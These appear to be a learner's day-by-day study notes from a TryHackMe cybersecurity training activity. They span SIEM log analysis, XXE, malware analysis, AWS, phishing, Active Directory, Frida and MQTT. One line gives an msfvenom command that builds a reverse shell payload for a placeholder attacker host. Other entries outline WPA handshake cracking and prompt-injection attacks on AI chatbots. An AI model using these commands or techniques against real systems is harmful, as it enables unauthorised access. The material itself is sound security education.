---
Status: Completed
Type: Activity
---

---
## Day 1 - OPSEC
### Concepts Discussed
- [[OSINT|OSINT]]
### Tools used
- file
- exiftool
- more @ https://tryhackme.com/r/room/opsec
## Day 2 - Log Analysis
### Tools used
- Elastic (SIEM tool)
- cyberchef
- more @ https://tryhackme.com/r/room/investigatingwithelk101
## Day 3 - Log analysis
- ELK
	ELK stands for Elasticsearch, Logstash, and Kibana. These are three open-source tools that are commonly used together to collect, store, analyse, and visualise data.
- Kibana is a web-based visualisation tool for exploring data stored in Elasticsearch. It can be used to create interactive dashboards and charts that help users to understand data.
	- KQL - Kibana Query Language - an easy-to-use language that can be used to search documents for values.

| **Query/Syntax** | **Description**                                                                                                                                                                               | **Example**                                             |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
| " "              | The two quotation marks are used to search for specific values within the documents. Values in quotation marks are used for **exact** searches.                                               | "TryHackMe"                                             |
| *                | The asterisk denotes a wildcard, which searches documents for similar matches to the value provided.                                                                                          | United* (would return United Kingdom and United States) |
| OR               | This logical operator is used to show documents that contain **either** of the values provided.                                                                                               | "United Kingdom" OR "England"                           |
| AND              | This logical operator is used to show documents that contain **both** values.                                                                                                                 | "Ben" AND "25"                                          |
| :                | This is used to search the (specified) field of a document for a value, such as an IP address. Note that the field you provide here will depend on the fields available in the index pattern. | ip.address: 10.10.10.10                                 |

- Kibana also allows using Lucene query, an advanced language that supports features such as fuzzy terms (searches for terms that are similar to the one provided), regular expressions, etc.
- File Upload Vulnerabilities
	File upload vulnerabilities occur when a website doesn't properly handle the files that users upload. If the site doesn't check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. 
- **RCE**: Uploading a script that the server runs gives the attacker control over it.  
- **XSS**: Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker's server.
- more @ https://tryhackme.com/jr/advancedelkqueries 
## Day 4 - Atomic Red Team
### Concepts Discussed
- MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge)  framework 
	- https://attack.mitre.org/
	- https://mitre-attack.github.io/attack-navigator/
### Tools used
- Atomic Red Team
	- The Atomic Red Team library is a collection of red team test cases that are mapped to the MITRE ATT&CK framework. The library consists of simple test cases that can be executed by any blue team to test for detection gaps and help close them down. The library also supports automation, where the techniques can be automatically executed. However, it is also possible to execute them manually.
	- eg: `Invoke-AtomicTest T1566.001 -TestNumbers 1`
- sysmon
	- https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
	- Sysmon refers to System Monitor, which is a Windows system service and device driver developed by Microsoft that is designed to monitor and log various events happening within a Windows system.
- more @ https://tryhackme.com/r/room/atomicredteam
## Day 5 - XXE
### Concepts Discussed
- XML
	Extensible Markup Language is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable
	- https://www.w3schools.com/xml/xml_whatis.asp
- Document Type Definition (DTD)
	- A DTD is a set of **rules** that defines the structure of an XML document. Just like a database scheme, it acts like a blueprint, telling you what elements (tags) and attributes are allowed in the XML file.
	- Entities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files.
- XML External Entity ([[XXE|XXE]])
	- XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
### Tools used
- [[Burpsuite]]
- more @ https://tryhackme.com/r/room/xxeinjection
## Day 6 - Sandboxes
### Concepts Discussed
- [[YARA]]
	YARA is a tool used to identify and classify malware based on patterns in its code. By writing custom rules, analysts can define specific characteristics to look for—such as particular strings, file headers, or behaviours—and YARA will scan files or processes to find matches, making it invaluable for detecting malicious code.
	*syntax*
	```
	rule name{
	meta:
	strings:
	condition:
	}
	```
	- In the **strings** section, we have defined variables that include the value to look out for: $cmd
	- In the **condition** section, we define when the rule will match the scanned file. In this case, if any of the specified strings are present.
- EDR
	Endpoint detection and response (EDR) is a series of tools that monitor devices for activity that could indicate a threat.
### Tools used
- FLOSS
	- https://github.com/mandiant/flare-floss
	- a powerful tool developed by Mandiant that functions similarly to the Linux strings tool but is optimized for malware analysis, making it ideal for revealing any concealed details. It extracts obfuscated strings from malware binaries.
- more @ https://tryhackme.com/r/room/flarevmarsenaloftools
## Day 7 - AWS Log Analysis
### Concepts Discussed
- AWS 
	- Amazon Web Services (AWS) is a comprehensive cloud computing platform offered by Amazon. It provides a wide range of services such as computing power, storage, databases, networking, analytics, and more, delivered over the internet on a pay-as-you-go basis.
	- EC2 instances (Amazon Elastic Compute Cloud) - virtualised instances in the cloud
	- **S3** (Amazon Simple Storage Service) - used for object storage
	- **IAM** (Identity and Access Management service) - a framework/process for controlling and securing digital identities and user access in organisations.
### Tools used
- AWS Cloudwatch
	 AWS CloudWatch is a monitoring and observability platform that gives us greater insight into our AWS environment by monitoring applications at multiple levels.
- AWS CLoudtrail
	 Monitor actions taken by a user, a role (granted to a user giving them certain permissions) or an AWS service and are recorded as events in AWS CloudTrail.
- JQ
	JQ is a lightweight and flexible command line processor that can be used on JSON to help us transform and filter that JSON data into meaningful data we can understand and use to gain security insights.
	- JQ takes two inputs: the filter you want to use, followed by the input file.
	- https://jqlang.github.io/jq/
- 
## Day 8 - Shellcode
### Concepts Discussed
- Shellcode 
	A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.
- Reverse Shell 
	 A type of connection in which the target (the machine you're trying to hack) initiates a connection back to your attacking machine (in this case, your machine will be the AttackBox).
- Windows API
### Tools used
- msfvenom
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`
- powershell
- [[Netcat|Netcat]]
- more @ https://tryhackme.com/r/room/avevasionshellcode

## Day 9 - GRC
### Concepts Discussed
- GRC
	- Governance, Risk, and Compliance
- more @ https://tryhackme.com/r/room/seriskmanagement
## Day 10 - Phishing
### Concepts Discussed
- Phishing
- Reverse Shell
- Macros
	In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.
- typosquatting
### Tools used
- [[Metasploit]]
- more @ https://tryhackme.com/module/phishing
## Day 11 - Wi-fi Attacks
### Concepts Discussed
- Wi-fi
- WPA/WPA2 cracking
	Wi-Fi Protected Access (WPA) was created to secure wireless communication. It uses a strong encryption algorithm. However, the security of this protocol is heavily influenced by the length and complexity of the Pre-Shared Key (PSK). While cracking WPA, attackers start by sending de-authentication packets to a legitimate user of the Wi-Fi network. Once the user disconnects, they try to reconnect to the network, and a 4-way handshake with the router takes place during this time. Meanwhile, the attacker turns its adaptor into monitor mode and captures the handshake. After the handshake is captured, the attacker can crack the password by using brute-force or dictionary attacks on the captured handshake file.
### Tools used
- iw
- Aircrack-_ng
	- It is a complete suite of tools to assess WiFi network security.
	- `airodump-ng` - used for packet capture, capturing raw 802.11 frames. (here it is used to capture the 4-way handshake)
	- `aireplay-ng` - sends deauthentication packets to either a specific client (targeted attack) or to all clients connected to an access point (broadcast attack).
	- `aircrack-ng` - used to crack the WPA/WP2 passphrase using the captured WPA handshake
- more @ https://tryhackme.com/module/networking
## Day 12 - Web timing attacks
### Concepts Discussed
- Web timing attack
	a web timing attack means we glean information from a web application by reviewing how long it takes to process our request. By making tiny changes in what we send or how we send it and observing the response time, we can access information we are not authorised to have.
	Timing attacks can often be divided into two main categories:
	- Information Disclosures
		Leveraging the differences in response delays, a threat actor can uncover information they should not have access to. For example, timing differences can be used to enumerate the usernames of an application, making it easier to stage a password-guessing attack and gain access to accounts.
	- Race Conditions
		Race conditions are similar to business logic flaws in that a threat actor can cause the application to perform unintended actions. However, the issue's root cause is how the web application processes requests, making it possible to cause the race condition. For example, if we send the same coupon request several times simultaneously, it might be possible to apply it more than once.
		Race conditions are a subset of web timing attacks that are even more special. With a race condition attack, we are no longer simply looking to gain access to information but can cause the web application to perform unintended actions on our behalf.
### Tools used
- burpsuite
- more @ https://tryhackme.com/r/room/raceconditionsattacks
## Day 13 - WebSockets
### Concepts Discussed
- Websockets
	WebSockets let your browser and the server keep a constant line of communication open.
- WebSocket Vulnerabilities
	- **Weak Authentication and Authorisation:** Unlike regular HTTP, WebSockets don't have built-in ways to handle user authentication or session validation. If you don't set these controls up properly, attackers could slip in and get access to sensitive data or mess with the connection.
	- **Message Tampering:** WebSockets let data flow back and forth constantly, which means attackers could intercept and change messages if encryption isn't used. This could allow them to inject harmful commands, perform actions they shouldn't, or mess with the sent data.
	- **Cross-Site WebSocket Hijacking (CSWSH):** This happens when an attacker tricks a user's browser into opening a WebSocket connection to another site. If successful, the attacker might be able to hijack that connection or access data meant for the legitimate server.
	- **Denial of Service (DoS):** Because WebSocket connections stay open, they can be targeted by DoS attacks. An attacker could flood the server with a ton of messages, potentially slowing it down or crashing it altogether.
### Tools used
- Burpsuite
- more @ https://tryhackme.com/module/learn-burp-suite
## Day 14 - Certificate Mismanagement
### Concepts Discussed
- Certificate:
	- **Public key**: At its core, a certificate contains a public key, part of a pair of cryptographic keys: a public key and a private key. The public key is made available to anyone and is used to encrypt data.
	- **Private key**: The private key remains secret and is used by the website or server to decrypt the data.
	- **Metadata**: Along with the key, it includes metadata that provides additional information about the certificate holder (the website) and the certificate. You usually find information about the Certificate Authority (CA), subject (information about the website), a uniquely identifiable number, validity period, signature, and hashing algorithm.
- Certificate Authority (CA)
	- A CA is a trusted entity that issues certificates. eg: GlobalSign, Let’s Encrypt, and DigiCert
	- The browser trusts these entities and performs a series of checks to ensure it is a trusted CA. 
	- Here is a breakdown of what happens with a certificate:
		- **Handshake**: Your browser requests a secure connection, and the website responds by sending a certificate, but in this case, it only requires the public key and metadata.
		- **Verification:** Your browser checks the certificate for its validity by checking if it was issued by a trusted CA. If the certificate hasn’t expired or been tampered with, and the CA is trusted, then the browser gives the green light. There are different types of checks you can do; check them [here](https://www.sectigo.com/resource-library/dv-ov-ev-ssl-certificates).
		- **Key exchange**: The browser uses the public key to encrypt a session key, which encrypts all communications between the browser and the website.
		- **Decryption**: The website (server) uses its private key to decrypt the session key, which is [symmetric](https://deviceauthority.com/symmetric-encryption-vs-asymmetric-encryption/). Now that both the browser and the website share a secret key (session key), we have established a secure and encrypted communication!
- **Self-Signed Certificates vs. Trusted CA Certificates**
	The process of acquiring a certificate with a CA is long, you create the certificate, and send it to a CA to sign it for you. If you don’t have tools and automation in place, this process can take weeks. Self-signed certificates are signed by an entity usually the same one that authenticates.
	- **Browsers** generally do not trust self-signed certificates because there is no third-party verification. The browser has no way of knowing if the certificate is authentic or if it’s being used for malicious purposes (like a **man-in-the-middle attack**).
	- **Trusted CA certificates**, on the other hand, are verified by a CA, which acts as a trusted third party to confirm the website’s identity.
- Man-in-the-middle attacks
### Tools used
- burp suite
## Day 15 - Active Directory
### Concepts Discussed
- Directory Services
	- Maps and provide access to network resources within an organisation. 
	- The **Lightweight Directory Access Protocol (LDAP)** forms the core of Directory Services. It provides a mechanism for accessing and managing directory data to ensure that searching for and retrieving information about subjects and objects such as users, computers, and groups is quick.
- Active Directory
	- Active Directory is a directory service developed by Microsoft for Windows domain networks. 
	- It stores information about network objects such as computers, users, and groups. 
	- It provides authentication and authorisation services, and allows administrators to manage network resources centrally.
	- [[Active Directory]]
- Active Directory Attacks
- Group Policy Objects (GPO) : Group Policy is a means to distribute configurations and policies to enrolled devices in the domain.
### Tools used
- powershell
- `Get-GPO`
- `Get-GPOREPORT`
- more @ https://tryhackme.com/r/room/activedirectoryhardening
## Day 16 - Azure
### Concepts Discussed
- Azure Key Vault
	Azure Key Vault is an Azure service that allows users to securely store and access secrets. These secrets can be anything from API Keys, certificates, passwords, cryptographic keys, and more. Essentially, anything you want to keep safe, away from the eyes of others, and easily configure and restrict access to is what you want to store in an Azure Key Vault.
	The secrets are stored in vaults, which are created by vault owners. Vault owners have full access and control over the vault, including the ability to enable auditing so a record is kept of who accessed what secrets and grant permissions for other users to access the vault (known as vault consumers).
- Microsoft Entra ID
	Microsoft Entra ID (formerly known as Azure Active Directory) is an identity and access management (IAM) service by Azure. It used to assess whether a user/application can access X resource.
- Assumed Breach scenario
	- The Assumed Breach scenario is a type of penetration testing setup in which an initial access or foothold is provided, mimicking the scenario in which an attacker has already established its access inside the internal network.
	- In this setup, the mindset is to assess how far an attacker can go once they get inside your network, including all possible attack paths that could branch out from the defined starting point of intrusion.
- Azure Cloud Shell : Azure Cloud Shell is a browser-based command-line interface that provides a way to manage Azure resources. Cloud Shell has built-in tools and pre-configured environments, including Azure CLI, Azure PowerShell, and popular development tools, making it an efficient solution for cloud management and automation tasks.
- Azure CLI : command-line tool for managing and configuring Azure resources.
	`az -h`
### Tools used
- Azure CLI
- more @ https://tryhackme.com/r/room/exploitingad
## Day 17 - Log Analysis
### Concepts Discussed
- SIEM
	Security Information and Event Management system that is used to aggregate security information in the form of logs, alerts, artifacts and events into a centralized platform that would allow security analysts to perform near real-time analysis during security monitoring.
	eg: Splunk
### Tools used
- Splunk
	Splunk is a platform for collecting, storing, and analysing machine data. It provides various tools for analysing data, including search, correlation, and visualisation. It is a powerful tool that organisations of all sizes can use to improve their IT operations and security posture.
- more @ https://tryhackme.com/jr/splunkdatamanipulation
## Day 18 - Prompt Injection
### Concepts Discussed
- AI - Neural Networks - LLM
- AI Exploits
	- **Data Poisoning:** As we discussed, an AI model is as good as the data it is trained on. Therefore, if some malicious actor introduces inaccurate or misleading data into the training data of an AI model while the AI is being trained or when it is being fine-tuned, it can lead to inaccurate results. 
	- **Sensitive Data Disclosure:** If not properly sanitised, AI models can often provide output containing sensitive information such as proprietary information, personally identifiable information (PII), Intellectual property, etc. For example, if a clever prompt is input to an AI chatbot, it may disclose its backend workings or the confidential data it has been trained on.
	- **Prompt Injection:** Prompt injection is one of the most commonly used attacks against LLMs and AI chatbots. In this attack, a crafted input is provided to the LLM that overrides its original instructions to get output that is not intended initially, similar to control flow hijack attacks against traditional systems.
- RCE
### Tools used
- tcpdump
- netcat
## Day 19 - Game Hacking
### Concepts Discussed
- Executables and Libraries
	- The **executable** file of an application is generally understood as a standalone binary file containing the compiled code we want to run. While some applications contain all the code they need to run in their executables, many applications usually rely on external code in library files with the "so" extension.
	- Library files are collections of functions that many applications can reuse. Unlike applications, they can't be directly executed as they serve no purpose by themselves. For a library function to be run, an executable will need to call it. The main idea behind libraries is to pack commonly used functions so developers don't need to reimplement them for every new application they develop.
### Tools used
- Frida
	- Frida is a powerful instrumentation tool that allows us to analyze, modify, and interact with running applications. 
	- How does it do that? Frida creates a thread in the target process; that thread will execute some bootstrap code that allows the interaction. This interaction, known as the agent, permits the injection of JavaScript code, controlling the application's behaviour in real-time. 
	- One of the most crucial functionalities of Frida is the Interceptor. This functionality lets us alter internal functions' input or output or observe their behaviour. In the example above, Frida would allow us to intercept and change the values of `x` and `y` that the library would receive on the fly. It would also allow us to change the returned `sum` value that is sent to the executable

	- we will run `frida-trace` for the first time so that it creates **handlers** for each library function used by the game. By editing the handler files, we can tell Frida what to do with the intercepted values of a function call. To have Frida create the handler files, you would run the following command:		`frida-trace ./main -i '*'`
		You will now see the `__handlers__` directory, containing JavaScript files for each function your application calls from a library. One such function will be called `say_hello()` and have a corresponding handler at `__handlers__/libhello.so/say_hello.js`, allowing us to interact with the target application in real-time.
		Each handler will have two functions known as hooks since they are hooked into the function respectively before and after the function call:
		- **onEnter:** From this function, we are mainly interested in the `args` variable, an array of pointers to the parameters used by our target function - a pointer is just an address to a value.
		- **onLeave:** here, we are interested in the `retval` variable, which will contain a pointer to the variable returned.
## Day 20 - Traffic Analysis
### Concepts Discussed
- Network Traffic Analysis
- C2
	- Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.
- C2 Communication
	- Whenever a machine is compromised, the command and control server (C2) drops its secret agent (payload) into the target machine. This secret agent is meant to obey the instructions of the C2 server. These instructions include executing malicious commands inside the target, exfiltrating essential files from the system, and much more. Interestingly, after getting into the system, the secret agent, in addition to obeying the instructions sent by the C2, has a way to keep the C2 updated on its current status. It sends a packet to the C2 every few seconds or even minutes to let it know it is active and ready to blast anything inside the target machine that the C2 aims to. These packets are known as beacons.
### Tools used
- [[Wireshark]]
- cyberchef
- more @ https://tryhackme.com/r/room/wiresharktrafficanalysis
## Day 21 - Reverse Engineering
### Concepts Discussed
- Reverse Engineering
- Disassembly 
	- Disassembling a binary shows the low-level machine instructions the binary will perform (you may know this as assembly). Because the output is translated machine instructions, you can see a detailed view of how the binary will interact with the system at what stage.
	- Tools such as IDA, Ghidra, and GDB can do this.
- Decompiling
	- Decompiling converts the binary into its high-level code, such as C++, C#, etc., making it easier to read. However, this translation can often lose information such as variable names. This method of reverse engineering a binary is useful if you want to get a high-level understanding of the application's flow.
- multi-stage binaries
### Tools used
- PEStudio
	software designed to investigate potentially malicious files and extract information from them without execution.
- ILSpy
	- https://github.com/icsharpcode/ILSpy
	- decompilation tool
- more @ https://tryhackme.com/r/room/x86assemblycrashcourse
## Day 22 - Kubernetes DFIR
### Concepts Discussed
- Kubernetes
	- Kubernetes is a container orchestration system used for automating deployment, scaling and management of applications.
- DFIR (Digital Forensics and Incident Response)
	- **Digital Forensics**, like any other "forensics" discipline, aims to collect and analyse digital evidence of an incident. The artefacts collected from the affected systems are used to trace the chain of attack and uncover all facts that ultimately led to the incident. DFIR experts sometimes use the term "post-mortem" to indicate that their analysis starts _after_ the incident has occurred and is performed on already compromised systems and networks.
	- **Incident Response**, while still relying on data analysis to investigate the incident, focuses on "responsive" actions such as threat containment and system recovery. The incident responder will isolate infected machines, use the data collected during the analysis to identify the "hole" in the infrastructure's security and close it, and then recover the affected systems to a clean, previous-to-compromise state.
- Docker
### Tools used
- Terminal
- `kubectl`
- more @ https://tryhackme.com/r/room/introtok8s
## Day 23 - Hash Cracking
### Concepts Discussed
- Hashing
- PDF cracking
### Tools used
- hash-id.py <-> www.Blackploit.com
- [[John the Ripper]]
- pdftotext - `pdftotext encrypted.pdf -upw password`
- more @ https://tryhackme.com/module/cryptography-101
- more @ https://tryhackme.com/r/room/johntheripperbasics
## Day 24 - Communications Protocol
### Concepts Discussed
- MQTT protocol
	MQTT stands for Message Queuing Telemetry Transport. It is a language very commonly used in IoT devices for communication purposes. It works on a publish/subscribe model, where any client device can publish messages, and other client devices can subscribe to the messages if they are related to a topic of interest. An MQTT broker connects the different clients, publishing and subscribing to messages.
	- **MQTT Clients:** MQTT clients are IoT devices, such as sensors and controllers, that publish or subscribe to messages using the MQTT protocol. For example, a temperature sensor can be a client that publishes temperature sensors at different places. An HVAC controller can also act as a client that subscribes to messages from the temperature sensor and turns the HVAC system on or off based on the input received.
	- **MQTT Broker:** An MQTT broker receives messages from publishing clients and distributes them to the subscribing clients based on their preferences.
	- **MQTT Topics:** Topics are used to classify the different types of messages. Clients can subscribe to messages based on their topics of interest. For example, a temperature sensor sending temperature readings can use the topic of “room temperature”, while an HVAC controller would subscribe to messages under the topic of “room temperature”. However, a light sensor can publish messages with the topic “light readings”. An HVAC controller does not need to subscribe to this topic. On the other hand, a light controller would subscribe to “light readings” but not to the topic of “room temperature”.
### Tools used
- wireshark
- mosquitto_pub
	- `mosquitto_pub -h localhost -t "some_topic" -m "message"`
	- `mosquitto_pub` is the command-line utility to publish an MQTT message
	- `-h localhost` refers to the MQTT broker, which is `localhost` in this task
	- `-t "some_topic"` specifies the **topic**
	- `-m "message"` sets the **message**, such as `"on"` and `"off"`
- more @ https://tryhackme.com/module/wireshark
## END
